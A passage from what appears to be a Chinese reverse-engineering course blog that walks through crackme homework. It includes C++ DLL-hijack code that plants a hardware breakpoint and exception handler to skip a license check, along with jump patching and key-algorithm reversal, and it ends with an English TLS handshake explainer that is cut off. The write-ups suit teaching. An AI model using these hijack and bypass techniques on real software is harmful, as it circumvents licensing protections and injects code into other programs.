<p>观察发现，上面有一个jnz跳转，跳过了成功的call，那么我们可以确定关键跳就在这里了<strong>0x401053</strong>。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208130101207.png" alt="image-20211208130101207"></p>
<h2 id="破解方法一：进程挂起-修改ZF标志位"><a href="#破解方法一：进程挂起-修改ZF标志位" class="headerlink" title="破解方法一：进程挂起+修改ZF标志位"></a>破解方法一：进程挂起+修改ZF标志位</h2><p>在之前得知的关键跳<strong>0x401053</strong>处下一个CC断点</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/1.gif" alt="1"></p>
<p>奇怪的是，程序会被终止。CC断点是将地址的首字节改为0xCC，因此我们判断该程序使用了某种校验方法（可能是CRC检测）来检测固定的某段代码段是否在运行过程中被修改。此处我们可以修改JNZ为NOP完成破解，但题目要求是不修改代码破解，所以我们还需另寻他法。</p>
<p>一个软件为了保证整个程序流程正常运行，不太可能将CRC检测(while loop形式)写在主线程（单一线程），不然后面的代码将无法执行，所以猜测可能是有新的线程建立。</p>
<p>在OD的T窗口查看线程情况</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208130947860.png" alt="image-20211208130947860"></p>
<p>发现了一个异常活跃的线程，基本可以确定是用来检测的线程 - 直接将线程挂起。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208131235695.png" alt="image-20211208131235695"></p>
<p>再次将<strong>0X00401053</strong>下断，发现程序正常，成功过掉CRC检测。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208131301886.png" alt="image-20211208131301886"></p>
<p>JNZ在ZF标志位为1的时候不跳转 <img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208130254590.png" alt="image-20211208130254590"></p>
<p>破解成功</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208131520337.png" alt="image-20211208131520337"></p>
<h2 id="破解方法二：硬件HOOK"><a href="#破解方法二：硬件HOOK" class="headerlink" title="破解方法二：硬件HOOK"></a>破解方法二：硬件HOOK</h2><p>已知检测程序是校验代码位数，从而判断代码是否被修改，但硬件断点不会被断下，因为它是通过操纵Dr寄存器来完成的下断。关于硬件断点的讲解见<a href="https://leihehehe.github.io/2021/12/07/%E6%B5%85%E6%9E%90%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E5%92%8C%E5%86%85%E5%AD%98%E6%96%AD%E7%82%B9/">浅析硬件断点和内存断点</a></p>
<p>硬件断点会触发**STATUS_SINGLE_STEP(单步异常)**，异常会交给程序的异常处理函数管理，若程序的异常处理函数不处理，才会交给调试器。</p>
<p>我们现在可以利用以下思路：</p>
<p>配合DLL劫持，让程序在JNZ跳转<strong>0x401053</strong>处触发硬件断点，同时给程序写一个异常处理函数 - 异常处理函数里是我们的恶意代码 - 将EIP+6，这样能够直接<strong>绕过JNZ判断</strong>。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208132929602.png" alt="image-20211208132929602"></p>
<p><strong>WIN10代码</strong>（我的环境）: <strong>winspool.drv</strong>，使用第四课的C语言劫持补丁代码进行改写。</p>
<p>注意:win10在设置硬件断点的时候必须<strong>先挂起目标线程</strong>，否则无法断点，所以我们需要创建一个新的线程，再在这个线程中暂停主线程从而保存修改后的寄存器内容。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">DWORD g_dwBreakPoint = <span class="number">0x401053</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(_In_ LPVOID lpMainThreadId)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	HANDLE hMainThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, TRUE, (DWORD)lpMainThreadId);</span><br><span class="line">	<span class="built_in">SuspendThread</span>(hMainThread);<span class="comment">// 暂停这个线程，避免它检测</span></span><br><span class="line">	CONTEXT ctx;</span><br><span class="line">	ctx.ContextFlags = CONTEXT_ALL;</span><br><span class="line">	<span class="built_in">GetThreadContext</span>(hMainThread, &amp;ctx);<span class="comment">//获取该线程的context=》包含了这个线程的各种参数，其中就包含dr寄存器的内容</span></span><br><span class="line">	ctx.Dr7 = (DWORD)<span class="number">0x1</span>;<span class="comment">//将该线程的dr7设为0x1=》代表DR0是有效的(L0=1)</span></span><br><span class="line">	ctx.Dr0 = g_dwBreakPoint;<span class="comment">//Dr0=硬件断点的地址</span></span><br><span class="line">	<span class="built_in">SetThreadContext</span>(hMainThread, &amp;ctx);<span class="comment">//把修改的值set到context里</span></span><br><span class="line">	<span class="built_in">ResumeThread</span>(hMainThread);<span class="comment">//恢复线程</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//异常捕捉</span></span><br><span class="line"><span class="function">DWORD NTAPI <span class="title">ExceptionHandler</span><span class="params">(EXCEPTION_POINTERS* ExceptionInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ((DWORD)ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress == g_dwBreakPoint)<span class="comment">//如果发生异常的位置就是我们想要跳过的位置</span></span><br><span class="line">	&#123;</span><br><span class="line">		ExceptionInfo-&gt;ContextRecord-&gt;Eip += <span class="number">6</span>;<span class="comment">//将该地址的EIP+6，从而我们可以跳过检测。</span></span><br><span class="line">		<span class="comment">//已经处理了异常，不需要再调用下一个异常处理来处理此异常</span></span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//调用下一个处理器</span></span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">	&#123;</span><br><span class="line">		::<span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;开始破解拉&quot;</span>, <span class="string">&quot;能否成功呢？leihehehe.github.io&quot;</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">DisableThreadLibraryCalls</span>(hModule);</span><br><span class="line">		<span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, (PVECTORED_EXCEPTION_HANDLER)ExceptionHandler);<span class="comment">//添加一个VEH异常处理的函数，如果有异常，该函数会被call</span></span><br><span class="line">		<span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, (LPVOID)<span class="built_in">GetCurrentThreadId</span>(), <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//创建线程来制造硬件断点,这里会发出异常，VEH异常处理函数能捕获它。</span></span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">Load</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (dwReason == DLL_PROCESS_DETACH)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">Free</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是<strong>win7代码</strong>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">DWORD g_dwBreakpoint = <span class="number">0x401053</span>; <span class="comment">// 关键指令，希望跳过这条指令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置硬件断点函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetHardwareBreakPoint</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CONTEXT ctx;</span><br><span class="line">	ctx.ContextFlags = CONTEXT_ALL;</span><br><span class="line">	<span class="built_in">GetThreadContext</span>(<span class="built_in">GetCurrentThread</span>(), &amp;ctx);</span><br><span class="line">	ctx.Dr7 = (DWORD)<span class="number">0x1</span>; <span class="comment">// 启用Dr0</span></span><br><span class="line">	ctx.Dr0 = g_dwBreakpoint; <span class="comment">// 设置硬件断点	</span></span><br><span class="line">	<span class="built_in">SetThreadContext</span>(<span class="built_in">GetCurrentThread</span>(), &amp;ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 异常处理函数</span></span><br><span class="line"><span class="function">DWORD NTAPI <span class="title">ExceptionHandler</span><span class="params">(PEXCEPTION_POINTERS pExceptionInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ((DWORD)pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress == g_dwBreakpoint)</span><br><span class="line">	&#123;</span><br><span class="line">		pExceptionInfo-&gt;ContextRecord-&gt;Eip += <span class="number">6</span>;</span><br><span class="line">		<span class="comment">// 已经处理了异常，不需要调用下一个异常处理来处理该异常</span></span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="built_in">DisableThreadLibraryCalls</span>(hModule);</span><br><span class="line">		<span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, (PVECTORED_EXCEPTION_HANDLER) ExceptionHandler);</span><br><span class="line">		<span class="built_in">SetHardwareBreakPoint</span>(); <span class="comment">//设置硬件断点,不需要创建一个线程来执行硬件断点</span></span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">Load</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (dwReason == DLL_PROCESS_DETACH)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">Free</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>破解成功。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/hw5HardBreakHook.gif" alt="hw5HardBreakHook"></p>
<h1 id="第六课课后作业"><a href="#第六课课后作业" class="headerlink" title="第六课课后作业"></a>第六课课后作业</h1><h2 id="软件使用-4"><a href="#软件使用-4" class="headerlink" title="软件使用"></a>软件使用</h2><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209185701029.png" alt="image-20211209185701029"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209185710786.png" alt="image-20211209185710786"></p>
<p>此处注册码并没有任何用处，随意输入也会提示注册成功</p>
<h2 id="破解方法"><a href="#破解方法" class="headerlink" title="破解方法"></a>破解方法</h2><p>运行起来转到代码段401000 - 从模块中删除分析</p>
<p>字符串搜索</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209185906127.png" alt="image-20211209185906127"></p>
<p>我们看见有一个<strong>\License.key</strong>，双击过去，在<strong>段开头</strong>断点</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209190001299.png" alt="image-20211209190001299"></p>
<p>我们猜测该程序是在启动的时候判断是否注册，而关键点就在于这个<strong>License.key</strong></p>
<p>记录一下下断点的地址<strong>004016D6</strong></p>
<p>现在重新运行软件，正常的话，程序应该在这里断下来，但现在并没有断下，发现断点被禁用了。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209190436336.png" alt="image-20211209190436336"></p>
<p>程序带壳，刚开始运行时，下断的地址没有被恢复，所以断点会被禁止。</p>
<p>因此我们需要在程序代码恢复后再给<strong>004016D6</strong>地址下断。</p>
<p>转到<strong>CreateWindowExW</strong>下断 - 大部分加壳程序代码在此处都已还原。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209191453997.png" alt="image-20211209191453997"></p>
<p>在004016D6下断</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209191547960.png" alt="image-20211209191547960"></p>
<p>运行后被断下,一直F8</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209191725737.png" alt="image-20211209191725737"></p>
<p>在此处修改jnz为nop即可</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209191821736.png" alt="image-20211209191821736"></p>
<h1 id="第七课课后作业"><a href="#第七课课后作业" class="headerlink" title="第七课课后作业"></a>第七课课后作业</h1><h2 id="软件使用-5"><a href="#软件使用-5" class="headerlink" title="软件使用"></a>软件使用</h2><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213153606918.png" alt="image-20211213153606918"></p>
<p><strong>作业要求：逆出算法，不能爆破，不能修改代码。</strong></p>
<h2 id="逆向流程"><a href="#逆向流程" class="headerlink" title="逆向流程"></a>逆向流程</h2><p>直接载入OD，找关键点</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213153904764.png" alt="image-20211213153904764"></p>
<p>在IDA中发现左侧第一个就是401000的函数，我们点击以后按F5，让它直接转变为代码</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213154209385.png" alt="image-20211213154209385"></p>
<p>分析a1应该是我们输入的key，下面的messageBox乱码，怎么解决呢？双击乱码的地方过去</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213154450306.png" alt="image-20211213154450306"></p>
<p>这种情况通常是因为IDA将其识别为Unicode，而unicode不能正确表示我们的字符串。</p>
<p>菜单栏-&gt;选项-&gt;字符串文本-&gt;修改为UTF-16LE</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213154629467.png" alt="image-20211213154629467"></p>
<p>发现已经改回来了。</p>
<p>再回到之前的代码区，按F5</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213154656969.png" alt="image-20211213154656969"></p>
<p>代码成功恢复</p>
<p>接下来我们对一些变量名做一些修改，方便理解</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213160036921.png" alt="image-20211213160036921"></p>
<h2 id="C语言逆算法"><a href="#C语言逆算法" class="headerlink" title="C语言逆算法"></a>C语言逆算法</h2><p>直接把代码从IDA上copy&amp;paste，然后做一些修改。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">checkKey</span><span class="params">(<span class="type">int</span> inputKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> result; <span class="comment">// </span></span><br><span class="line">	<span class="type">int</span> v2; <span class="comment">// 这个应该是用来作为BOOL，作为一个FLAG判断</span></span><br><span class="line"></span><br><span class="line">	v2 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (inputKey * (inputKey - <span class="number">23</span>) == <span class="number">-102</span>)</span><br><span class="line">		v2 = <span class="number">1</span>;</span><br><span class="line">	result = v2;</span><br><span class="line">	<span class="keyword">if</span> (v2)<span class="comment">//如果上面的条件成立了，则继续检测下面是否成立</span></span><br><span class="line">	&#123;</span><br><span class="line">		result = inputKey * inputKey * inputKey;</span><br><span class="line">		<span class="keyword">if</span> (result == <span class="number">4913</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xFFFFFFFF</span>; i++) &#123;<span class="comment">//遍历key是否正确</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">checkKey</span>(i)) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213160052211.png" alt="image-20211213160052211"></p>
<p>算出来正确的注册码是17</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213160126767.png" alt="image-20211213160126767"></p>
<h1 id="第八课课后作业"><a href="#第八课课后作业" class="headerlink" title="第八课课后作业"></a>第八课课后作业</h1><h2 id="软件使用-6"><a href="#软件使用-6" class="headerlink" title="软件使用"></a>软件使用</h2><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213160322310.png" alt="image-20211213160322310"></p>
<h2 id="去花指令"><a href="#去花指令" class="headerlink" title="去花指令"></a>去花指令</h2><p>载入OD后在字符串中查找，发现并没有注册失败或成功，跟进<code>请输入注册码</code>，发现后面代码加了花指令</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213162550645.png" alt="image-20211213162550645"></p>
<p>我选择先去除花指令。</p>
<p>花指令一般是由恒成立的跳转组成的，我们只需要nop掉永远不会访问的无效指令，就能去除</p>
<p>例如</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213163002542.png" alt="image-20211213163002542"></p>
<p>在数据窗口中去除 <img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213163034570.png" alt="image-20211213163034570"></p>
<p>将所有花指令去除后，复制保存到可执行文件</p>
<h2 id="分析算法"><a href="#分析算法" class="headerlink" title="分析算法"></a>分析算法</h2><p>因为程序比较小，我们可以直接拖入IDA，在前几个函数中能找到我们的关键位置</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213163536224.png" alt="image-20211213163536224"></p>
<p>我们做一些注释</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213164107383.png" alt="image-20211213164107383"></p>
<p>其中一个call中的**&amp;byte_442578<strong>引起了我的注意，我有些困惑这是什么，根据上下文猜测，感觉后面的v4像是我们输入的key，</strong>&amp;byte_442578**又是什么呢？</p>
<p>双击进去看看，此时它为数据类型</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213164245856.png" alt="image-20211213164245856"></p>
<p>我们将他转换成字符串，发现它变成了%s</p>
<p>返回刚才的地方F5，显而易见，这是一个**scanf()**方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213164406622.png" alt="image-20211213164406622"></p>
<p>我们进入**algrithms()**继续分析算法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213165156917.png" alt="image-20211213165156917"></p>
<p>一顿分析后，我们发现下方有一个<code>*(_BYTE *)</code>，通常这种<strong>pointer</strong>前方又有一个星号的情况，都是因为IDA识别错误。</p>
<p>我们发现括号后面finalResult，和inputKey的类型是错误的</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213165345317.png" alt="image-20211213165345317"></p>
<p>修改一下参数类型</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213165435708.png" alt="image-20211213165435708"></p>
<p>显示正常。</p>
<p>同样我们再修改一下以下位置</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213165659661.png" alt="image-20211213165659661"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213165742029.png" alt="image-20211213165742029"></p>
<p>对应的值为**’bcdaren’**</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213165804348.png" alt="image-20211213165804348"></p>
<h2 id="C语言逆算法-1"><a href="#C语言逆算法-1" class="headerlink" title="C语言逆算法"></a>C语言逆算法</h2><p>将算法从IDA复制到C</p>
<p>观察下面的算法,我们发现再第二个for循环中，<strong>i</strong>一直没变，不停的再给同一个数重新赋值新的<strong>aBacdaren_1[j]^xxx</strong>，所以我们可以看出来，其实这两个for循环是在干一件事，就是把最后一个字母<strong>n</strong>和(key中的每一位+13)做异或运算。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = i;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt;= keyLen )                        <span class="comment">// 如果循环次数大于了key的长度就退出循环</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(<span class="string">&quot;bcdaren&quot;</span>); ++j )</span><br><span class="line">    finalResult[i] = aBcdaren_1[j] ^ (inputKey[i] + <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>化简以后：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; keyLen; i++) &#123;</span><br><span class="line">		finalResult[i] = <span class="string">&#x27;n&#x27;</span> ^ (inputKey[i] + <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>于是我们可以分析出，该程序的算法如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span>* <span class="title">algrithms</span><span class="params">(<span class="type">char</span>* inputKey, <span class="type">char</span>* finalResult, <span class="type">unsigned</span> <span class="type">int</span> maxLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">signed</span> <span class="type">int</span> v4; </span><br><span class="line">	<span class="type">signed</span> <span class="type">int</span> keyLen; </span><br><span class="line">	<span class="type">signed</span> <span class="type">int</span> i; </span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (inputKey &amp;&amp; finalResult &amp;&amp; maxLen)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strlen</span>(inputKey) &lt;= maxLen)           <span class="comment">// 判断长度是否小于maxLen</span></span><br><span class="line">			keyLen = <span class="built_in">strlen</span>(inputKey);                <span class="comment">// 如果&lt;=最大长度，取key原本的长度</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			keyLen = maxLen;                          <span class="comment">// 如果大于最大长度，取最大长度</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; keyLen; i++) &#123;</span><br><span class="line">				finalResult[i] = <span class="string">&#x27;n&#x27;</span> ^ (inputKey[i] + <span class="number">13</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> finalResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213172917906.png" alt="image-20211213172917906"></p>
<p>最后<strong>finalResult</strong>的值应该等于<code>((++**--,,//..QQPP</code></p>
<p>我们再写个逆运算的算法，注意，<strong>异或运算中任意两个数异或可以得到第三个数</strong>，例如：</p>
<p>a^b=c</p>
<p>a^c=b</p>
<p>b^c=a</p>
<p><strong>最终逆向算法：</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span>* <span class="title">getCorrectKey</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* keyToBeConverte, <span class="type">char</span>* finalResult, <span class="type">unsigned</span> <span class="type">int</span> maxLen)</span> </span>&#123;</span><br><span class="line">	<span class="type">signed</span> <span class="type">int</span> keyLen;</span><br><span class="line">	<span class="keyword">if</span> (keyToBeConverte &amp;&amp; finalResult &amp;&amp; maxLen) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strlen</span>(keyToBeConverte) &lt;= maxLen)           <span class="comment">// 判断长度是否小于maxLen</span></span><br><span class="line">			keyLen = <span class="built_in">strlen</span>(keyToBeConverte);                <span class="comment">// 如果&lt;=最大长度，取key原本的长度</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			keyLen = maxLen;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; keyLen; i++) &#123;</span><br><span class="line">			finalResult[i] = (<span class="string">&#x27;n&#x27;</span> ^ keyToBeConverte[i])<span class="number">-13</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> finalResult;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> finalResult[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="built_in">getCorrectKey</span>(<span class="string">&quot;((++**--,,//..QQPP&quot;</span>, finalResult, <span class="number">128</span>));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213175431347.png" alt="image-20211213175431347"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213175444354.png" alt="image-20211213175444354"></p>
]]></content>
      <categories>
        <category>Reverse Engineering</category>
      </categories>
      <tags>
        <tag>Write-up</tag>
        <tag>Reverse Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>Security Protocols</title>
    <url>/2022/06/12/Security-Protocols/</url>
    <content><![CDATA[<h1 id="SSL-TLS-Protocol"><a href="#SSL-TLS-Protocol" class="headerlink" title="SSL/TLS Protocol"></a>SSL/TLS Protocol</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><code>SSL</code> stands for <strong>Secure Sockets Layer</strong>, and TLS stands for <strong>Transport Layer Security</strong>. TLS is an updated and more secure version of SSL. Nowadays, the SSL has been deprecated and replaced with TLS, therefore, we will use the term “TLS” to explain this protocol.</p>
<span id="more"></span>

<p>SSL/TLS protocol is used to achieve the following goals</p>
<ul>
<li>CONFidentiality</li>
<li>INTegrity</li>
<li>AUTHentication</li>
</ul>
<p>A very common use is <strong>HTTPS</strong>. <strong>HTTPS</strong> is the HTTP protocol with data encryption using SSL/TLS.</p>
<h2 id="TLS-Handshake-Explanation"><a href="#TLS-Handshake-Explanation" class="headerlink" title="TLS Handshake Explanation"></a>TLS Handshake Explanation</h2><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612155851.png" alt="TLS handshake"></p>
<ol>
<li><p>Client sends hello, supported TLS version, supported cipher suite and Random(client random string).</p>
</li>
<li><p>Server sends message “server hello” back to the client, and also responds with chosen cipher suite, server random string, and SSL certificate(with server’s public key).</p>
</li>
<li><p>The client will verify the SSL certificate information, get the public key of the server.</p>
</li>
<li><p>Client sends pre-master key generated using the public key he just got from the server.</p>
</li>
<li><p>Server decrypts the pre-master key from the client by using his private key.</p>
</li>
<li><p>Both client and server use “client random”, “server random” and pre-master key to generate the same shared key using the same algorithm</p>
</li>
<li><p>Client is ready: client sends “finished” message which is encrypted by the shared key.</p>
</li>
<li><p>Server is ready: server sends “finished” message which is encrypted by the shared key.</p>
</li>
<li><p>Handshake is finished, server and client use symmetric crypto to communicate with each other.</p>
</li>
</ol>
<h2 id="How-SSL-TLS-protocol-prevent-attack"><a href="#How-SSL-TLS-protocol-prevent-attack" class="headerlink" title="How SSL/TLS protocol prevent attack"></a>How SSL/TLS protocol prevent attack</h2><h3 id="Scenario-1"><a href="#Scenario-1" class="headerlink" title="Scenario 1"></a>Scenario 1</h3><p>Attacker intercpet the message sending from the client to the server, direct it to themselves, and the attacker itself will send hello message to the client. Server will send its certificate to attacker and attacker will send this back to the client. </p>
<p><strong>Solution</strong></p>
